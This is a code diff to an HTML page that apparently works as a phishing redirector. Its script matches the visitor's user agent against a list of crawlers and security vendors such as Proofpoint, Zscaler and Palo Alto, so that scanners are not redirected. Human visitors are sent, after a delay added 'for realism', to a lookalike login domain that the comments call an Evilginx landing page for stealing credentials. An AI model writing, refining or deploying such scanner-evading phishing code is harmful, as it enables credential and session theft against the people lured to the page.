@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -11,10 +12,12 @@
       // Filter out common security scanners
       const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft|zscaler|paloalto|fireeye/i;
       
+      // Check if user is likely a human
       if (!botPattern.test(navigator.userAgent)) {
-          // Instant redirect for humans
-          window.location.replace("https://login.file-share-hub.com/DbhZOTUR
-");
+          setTimeout(function() {
+              // Redirect human to the Evilginx landing page
+              window.location.href = "https://login.file-share-hub.com/DbhZOTUR";
+          }, 1500); // 1.5 second delay for "realism"
       }
     </script>
 </body>
